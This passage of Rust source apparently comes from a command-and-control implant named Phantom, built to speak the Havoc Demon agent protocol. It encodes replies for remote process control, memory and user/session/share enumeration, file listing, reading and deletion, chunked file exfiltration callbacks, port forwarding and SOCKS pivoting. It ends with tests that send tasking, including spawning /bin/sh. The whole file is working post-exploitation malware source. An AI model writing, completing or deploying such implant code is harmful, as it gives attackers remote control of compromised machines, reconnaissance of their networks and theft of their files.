    let size = u32::try_from(end.checked_sub(base)?).ok()?;
    let protect = map_linux_protection(perms);
    let mem_type = map_linux_memory_type(perms, path);
    Some(MemoryRegion { base, size, protect, state: MEM_COMMIT, mem_type })
}

fn map_linux_protection(perms: &str) -> u32 {
    match perms.as_bytes() {
        [b'-', b'-', b'-', b'-', ..] => PAGE_NOACCESS,
        [b'r', b'-', b'-', b'-', ..] => PAGE_READONLY,
        [b'r', b'w', b'-', b'p', ..] => PAGE_READWRITE,
        [b'r', b'w', b'-', b's', ..] => PAGE_WRITECOPY,
        [b'-', b'-', b'x', b'-', ..] => PAGE_EXECUTE,
        [b'r', b'-', b'x', b'p', ..] | [b'r', b'-', b'x', b's', ..] => PAGE_EXECUTE_READ,
        [b'r', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'r', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'w', b'-', b'p', ..] | [b'-', b'w', b'-', b's', ..] => PAGE_READWRITE,
        [b'-', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'-', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'-', b'x', b'p', ..] | [b'-', b'-', b'x', b's', ..] => PAGE_EXECUTE,
        _ => PAGE_NOACCESS,
    }
}

fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
    match path {
        Some(path) if path.starts_with('/') => {
            if perms.contains('x') {
                MEM_IMAGE
            } else {
                MEM_MAPPED
            }
        }
        _ => MEM_PRIVATE,
    }
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

fn encode_process_list(
    process_ui: u32,
    processes: &[ProcessEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(process_ui);
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_bool(process.is_wow64));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_u32(process.session));
        payload.extend_from_slice(&encode_u32(process.threads));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
    }
    Ok(payload)
}

fn encode_proc_create(
    path: &str,
    pid: u32,
    success: bool,
    piped: bool,
    verbose: bool,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
    payload.extend_from_slice(&encode_utf16(path)?);
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_bool(piped));
    payload.extend_from_slice(&encode_bool(verbose));
    Ok(payload)
}

fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(pid));
    payload
}

fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
    }
    Ok(payload)
}

fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
    payload.extend_from_slice(&encode_u32(pid));
    for (name, base) in modules {
        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
        payload.extend_from_slice(&encode_u64(*base));
    }
    Ok(payload)
}

fn encode_proc_memory(pid: u32, query_protection: u32, regions: &[MemoryRegion]) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Memory));
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_u32(query_protection));
    for region in regions {
        payload.extend_from_slice(&encode_u64(region.base));
        payload.extend_from_slice(&encode_u32(region.size));
        payload.extend_from_slice(&encode_u32(region.protect));
        payload.extend_from_slice(&encode_u32(region.state));
        payload.extend_from_slice(&encode_u32(region.mem_type));
    }
    payload
}

fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
    Ok(payload)
}

fn encode_net_name_list(
    subcommand: DemonNetCommand,
    target: &str,
    names: &[String],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for name in names {
        payload.extend_from_slice(&encode_utf16(name)?);
    }
    Ok(payload)
}

fn encode_net_logons(target: &str, users: &[String]) -> Result<Vec<u8>, PhantomError> {
    encode_net_name_list(DemonNetCommand::Logons, target, users)
}

fn encode_net_sessions(target: &str, sessions: &[SessionEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Sessions));
    payload.extend_from_slice(&encode_utf16(target)?);
    for session in sessions {
        payload.extend_from_slice(&encode_utf16(&session.client)?);
        payload.extend_from_slice(&encode_utf16(&session.user)?);
        payload.extend_from_slice(&encode_u32(session.active));
        payload.extend_from_slice(&encode_u32(session.idle));
    }
    Ok(payload)
}

fn encode_net_shares(target: &str, shares: &[ShareEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Share));
    payload.extend_from_slice(&encode_utf16(target)?);
    for share in shares {
        payload.extend_from_slice(&encode_utf16(&share.name)?);
        payload.extend_from_slice(&encode_utf16(&share.path)?);
        payload.extend_from_slice(&encode_utf16(&share.remark)?);
        payload.extend_from_slice(&encode_u32(share.access));
    }
    Ok(payload)
}

fn encode_net_groups(
    subcommand: DemonNetCommand,
    target: &str,
    groups: &[GroupEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for group in groups {
        payload.extend_from_slice(&encode_utf16(&group.name)?);
        payload.extend_from_slice(&encode_utf16(&group.description)?);
    }
    Ok(payload)
}

fn encode_net_users(target: &str, users: &[UserEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Users));
    payload.extend_from_slice(&encode_utf16(target)?);
    for user in users {
        payload.extend_from_slice(&encode_utf16(&user.name)?);
        payload.extend_from_slice(&encode_bool(user.is_admin));
    }
    Ok(payload)
}

fn encode_fs_dir_listing(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
    list_only: bool,
) -> Result<Vec<u8>, PhantomError> {
    let start_path = directory_root_path(target);
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_bool(list_only));
    payload.extend_from_slice(&encode_utf16(&start_path)?);

    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
    payload.extend_from_slice(&encode_bool(true));
    for listing in listings {
        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
        let total_size = listing
            .entries
            .iter()
            .filter(|entry| !entry.is_dir)
            .map(|entry| entry.size)
            .sum::<u64>();

        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
        payload.extend_from_slice(&encode_u32(files));
        payload.extend_from_slice(&encode_u32(dirs));
        if !list_only {
            payload.extend_from_slice(&encode_u64(total_size));
        }

        for entry in listing.entries {
            payload.extend_from_slice(&encode_utf16(&entry.name)?);
            if !list_only {
                payload.extend_from_slice(&encode_bool(entry.is_dir));
                payload.extend_from_slice(&encode_u64(entry.size));
                payload.extend_from_slice(&encode_u32(entry.modified.day));
                payload.extend_from_slice(&encode_u32(entry.modified.month));
                payload.extend_from_slice(&encode_u32(entry.modified.year));
                payload.extend_from_slice(&encode_u32(entry.modified.minute));
                payload.extend_from_slice(&encode_u32(entry.modified.hour));
            }
        }
    }

    Ok(payload)
}

fn collect_directory_listings(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
) -> Result<Vec<FilesystemListing>, PhantomError> {
    let mut listings = Vec::new();
    let mut pending = vec![target.to_path_buf()];
    while let Some(root) = pending.pop() {
        let mut entries = Vec::new();
        let read_dir = fs::read_dir(&root).map_err(|error| io_error(&root, error))?;
        for entry in read_dir {
            let entry = entry.map_err(|error| io_error(&root, error))?;
            let path = entry.path();
            let metadata = entry.metadata().map_err(|error| io_error(&path, error))?;
            if metadata.is_dir() && subdirs {
                pending.push(path.clone());
            }
            if files_only && metadata.is_dir() {
                continue;
            }
            if dirs_only && metadata.is_file() {
                continue;
            }
            entries.push(FilesystemEntry {
                name: entry.file_name().to_string_lossy().into_owned(),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                modified: modified_time(metadata.modified().ok()),
            });
        }
        entries.sort_by(|left, right| left.name.cmp(&right.name));
        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
    }
    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
    Ok(listings)
}

fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
    let unix_timestamp = timestamp
        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
        .map(|duration| duration.as_secs() as i64)
        .unwrap_or_default();
    let datetime =
        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
    ModifiedTime {
        day: datetime.day().into(),
        month: u8::from(datetime.month()).into(),
        year: u32::try_from(datetime.year()).unwrap_or_default(),
        minute: datetime.minute().into(),
        hour: datetime.hour().into(),
    }
}

fn directory_root_path(path: &Path) -> String {
    let display = path.display().to_string();
    if display.ends_with('/') { display } else { format!("{display}/") }
}

fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(contents)?);
    Ok(payload)
}

fn encode_fs_path_only(
    subcommand: DemonFilesystemCommand,
    path: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
    payload.extend_from_slice(&encode_bool(is_dir));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_copy_move(
    subcommand: DemonFilesystemCommand,
    success: bool,
    from: &Path,
    to: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
    Ok(payload)
}

fn encode_u32(value: u32) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_u64(value: u64) -> Vec<u8> {
    value.to_be_bytes().to_vec()
}

fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(value.len())
        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    encode_bytes(&encoded)
}

fn encode_port_forward_add(
    command: DemonSocketCommand,
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(command));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socks_proxy_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload
}

fn encode_socks_proxy_remove(socket_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload
}

fn encode_rportfwd_remove(
    socket_id: u32,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

fn encode_socks_proxy_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

/// Encode a `DemonCallback::File` (file-open) payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32][file_size:u32][path:UTF-8]`
fn encode_file_open(
    file_id: u32,
    file_size: u64,
    file_path: &str,
) -> Result<Vec<u8>, PhantomError> {
    let truncated_size = u32::try_from(file_size.min(u64::from(u32::MAX)))
        .map_err(|_| PhantomError::InvalidResponse("file size overflow"))?;
    let inner_len = 4 + 4 + file_path.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::File)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file open inner too large"))?,
    ));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(&encode_u32(truncated_size));
    payload.extend_from_slice(file_path.as_bytes());
    Ok(payload)
}

/// Encode a `DemonCallback::FileWrite` (chunk) payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32][chunk_data]`
fn encode_file_chunk(file_id: u32, data: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let inner_len = 4 + data.len();
    let mut payload = Vec::with_capacity(4 + 4 + inner_len);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileWrite)));
    payload.extend_from_slice(&encode_u32(
        u32::try_from(inner_len)
            .map_err(|_| PhantomError::InvalidResponse("file chunk inner too large"))?,
    ));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(data);
    Ok(payload)
}

/// Encode a `DemonCallback::FileClose` payload for `BeaconOutput`.
///
/// Wire format: `[callback_type:u32][len:u32][file_id:u32]`
fn encode_file_close(file_id: u32) -> Result<Vec<u8>, PhantomError> {
    let mut payload = Vec::with_capacity(12);
    payload.extend_from_slice(&encode_u32(u32::from(DemonCallback::FileClose)));
    payload.extend_from_slice(&encode_u32(4));
    payload.extend_from_slice(&encode_u32(file_id));
    Ok(payload)
}

/// Encode a `CommandTransfer` response payload.
fn encode_transfer_list(downloads: &[ActiveDownload]) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::List));
    for download in downloads {
        payload.extend_from_slice(&encode_u32(download.file_id));
        let read_size = u32::try_from(download.read_size).unwrap_or(u32::MAX);
        payload.extend_from_slice(&encode_u32(read_size));
        payload.extend_from_slice(&encode_u32(download.state as u32));
    }
    payload
}

/// Encode a transfer stop/resume/remove response payload.
fn encode_transfer_action(subcommand: DemonTransferCommand, found: bool, file_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(found));
    payload.extend_from_slice(&encode_u32(file_id));
    payload
}

/// Encode the secondary close callback sent after a transfer remove, matching Demon behaviour.
///
/// Wire format: `[subcommand:u32][file_id:u32][reason:u32]`
/// Reason 1 = `DOWNLOAD_REASON_REMOVED`.
fn encode_transfer_remove_close(file_id: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonTransferCommand::Remove));
    payload.extend_from_slice(&encode_u32(file_id));
    payload.extend_from_slice(&encode_u32(1)); // DOWNLOAD_REASON_REMOVED
    payload
}

impl PendingCallback {
    pub(crate) fn command_id(&self) -> u32 {
        match self {
            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
            Self::Error { .. } => u32::from(DemonCommand::CommandError),
            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
            Self::KillDate { .. } => u32::from(DemonCommand::CommandKillDate),
            Self::Structured { command_id, .. } => *command_id,
            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
            Self::FileOpen { .. } | Self::FileChunk { .. } | Self::FileClose { .. } => {
                u32::from(DemonCommand::BeaconOutput)
            }
        }
    }

    pub(crate) fn request_id(&self) -> u32 {
        match self {
            Self::Output { request_id, .. }
            | Self::Error { request_id, .. }
            | Self::Exit { request_id, .. }
            | Self::KillDate { request_id, .. }
            | Self::Structured { request_id, .. }
            | Self::MemFileAck { request_id, .. }
            | Self::FsUpload { request_id, .. }
            | Self::Socket { request_id, .. }
            | Self::FileOpen { request_id, .. }
            | Self::FileChunk { request_id, .. }
            | Self::FileClose { request_id, .. } => *request_id,
        }
    }

    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
        match self {
            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
            Self::Error { text, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(0x0d));
                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
                Ok(payload)
            }
            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
            Self::KillDate { .. } => Ok(Vec::new()),
            Self::Structured { payload, .. } => Ok(payload.clone()),
            Self::MemFileAck { mem_file_id, success, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(*mem_file_id));
                payload.extend_from_slice(&encode_bool(*success));
                Ok(payload)
            }
            Self::FsUpload { file_size, path, .. } => {
                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
                payload.extend_from_slice(&encode_u32(*file_size));
                payload.extend_from_slice(&encode_utf16(path)?);
                Ok(payload)
            }
            Self::Socket { payload, .. } => Ok(payload.clone()),
            Self::FileOpen { file_id, file_size, file_path, .. } => {
                encode_file_open(*file_id, *file_size, file_path)
            }
            Self::FileChunk { file_id, data, .. } => encode_file_chunk(*file_id, data),
            Self::FileClose { file_id, .. } => encode_file_close(*file_id),
        }
    }
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use std::net::Ipv4Addr;

    use red_cell_common::demon::{
        DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
        DemonProcessCommand, DemonSocketCommand, DemonTransferCommand,
    };
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    use super::{
        DownloadTransferState, GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
        PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState,
        SessionEntry, UserEntry, execute, parse_group_entries, parse_logged_on_sessions,
        parse_logged_on_users, parse_memory_region, parse_user_entries,
    };

    fn utf16_payload(value: &str) -> Vec<u8> {
        let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        let mut payload = Vec::with_capacity(4 + utf16.len());
        payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        payload.extend_from_slice(&utf16);
        payload
    }

    fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
        let end = *offset + 4;
        let value = u32::from_be_bytes(payload[*offset..end].try_into().expect("u32"));
        *offset = end;
        value
    }

    fn read_u64(payload: &[u8], offset: &mut usize) -> u64 {
        let end = *offset + 8;
        let value = u64::from_be_bytes(payload[*offset..end].try_into().expect("u64"));
        *offset = end;
        value
    }

    fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
        let len = read_u32(payload, offset) as usize;
        let end = *offset + len;
        let bytes = &payload[*offset..end];
        *offset = end;
        bytes
    }

    fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
        let bytes = read_bytes(payload, offset);
        let utf16 = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&utf16).expect("utf16")
    }

    async fn poll_until<F>(state: &mut PhantomState, mut predicate: F)
    where
        F: FnMut(&PhantomState) -> bool,
    {
        for _ in 0..100 {
            state.poll().await.expect("poll");
            if predicate(state) {
                return;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }

        panic!("condition not met before poll timeout");
    }

    async fn poll_n(state: &mut PhantomState, iterations: usize) {
        for _ in 0..iterations {
            state.poll().await.expect("poll");
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    #[tokio::test]
    async fn command_no_job_returns_no_callbacks() {
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let mut state = PhantomState::default();
        execute(&package, &mut state).await.expect("execute");
        assert!(state.drain_callbacks().is_empty());
    }

    #[tokio::test]
    async fn get_pwd_queues_structured_fs_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
        assert_eq!(*request_id, 1);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonFilesystemCommand::GetPwd));
        let path = read_utf16(payload, &mut offset);
        assert!(!path.is_empty());
    }

    #[tokio::test]
    async fn proc_create_with_pipe_returns_structured_and_output_callbacks() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&utf16_payload("/bin/sh"));
        payload.extend_from_slice(&utf16_payload("printf phantom-test"));
        payload.extend_from_slice(&1_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [
            PendingCallback::Structured { command_id, request_id, payload },
            PendingCallback::Output { request_id: output_request_id, text },
        ] = callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(*request_id, 2);
        assert_eq!(*output_request_id, 2);
        assert_eq!(text, "phantom-test");

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Create));
        assert_eq!(read_utf16(payload, &mut offset), "/bin/sh");
        assert!(read_u32(payload, &mut offset) > 0);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 1);
        assert_eq!(read_u32(payload, &mut offset), 0);
    }

    #[tokio::test]
    async fn proc_list_returns_structured_process_payload() {
        let package =
            DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandProcList));
        assert_eq!(*request_id, 7);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 0);
        assert!(offset < payload.len());
    }

    #[tokio::test]
    async fn net_domain_returns_structured_payload() {
        let package = DemonPackage::new(
            DemonCommand::CommandNet,
            8,
            (DemonNetCommand::Domain as i32).to_le_bytes().to_vec(),
        );
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 8);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Domain));
        let _domain = std::str::from_utf8(read_bytes(payload, &mut offset)).expect("utf8");
    }

    #[tokio::test]
    async fn net_users_returns_structured_payload_instead_of_stub_error() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonNetCommand::Users as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload("HOST01"));
        let package = DemonPackage::new(DemonCommand::CommandNet, 9, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(*request_id, 9);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Users));
        assert_eq!(read_utf16(payload, &mut offset), "HOST01");
        assert!(offset < payload.len(), "expected at least one passwd-backed user");
        let _username = read_utf16(payload, &mut offset);
        let _is_admin = read_u32(payload, &mut offset);
    }

    #[tokio::test]
    async fn net_computer_echoes_target_with_structured_payload() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonNetCommand::Computer as i32).to_le_bytes());
